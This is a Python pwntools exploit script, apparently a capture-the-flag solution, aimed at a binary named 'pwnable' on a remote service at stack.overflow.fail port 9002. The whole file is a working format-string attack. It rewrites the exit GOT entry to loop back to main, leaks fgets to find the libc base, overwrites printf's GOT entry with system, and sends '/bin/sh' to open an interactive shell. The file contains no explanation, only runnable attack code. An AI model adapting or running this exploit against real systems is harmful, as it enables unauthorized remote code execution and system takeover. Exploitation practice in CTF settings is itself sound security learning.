from pwn import *

elf = ELF("./pwnable")

libc = ELF("./libc6-i386_2.23-0ubuntu10_amd64.so")
sock = remote("stack.overflow.fail", 9002)
#libc = ELF("/lib/libc.so.6")
#sock = remote("localhost", 9002)

# change exit@got --> main
writes = {
    elf.got['exit']: elf.symbols['main']
}
payload = "AA" + fmtstr_payload(11, writes, numbwritten=2, write_size='short')
sock.recvuntil("back.\n")
sock.sendline(payload)

# leak libc base
payload = "AA"
payload += p32(elf.got['fgets'])
payload += ".%11$s."
sock.recvuntil("back.\n")
sock.sendline(payload)
rets = sock.recvline().split(".")
addr_fgets = u32(rets[-2][:4])
libc_base = addr_fgets - libc.symbols['fgets']
print("[+] libc base = " + hex(libc_base))
addr_system = libc_base + libc.symbols['system']

# change printf@got --> system
writes = {
    elf.got['printf']: addr_system
}
payload = "AA" + fmtstr_payload(11, writes, numbwritten=2, write_size='short')
sock.recvuntil("back.\n")
sock.sendline(payload)

# get the shell!
sock.recvuntil("back.\n")
sock.sendline("/bin/sh")

sock.interactive()
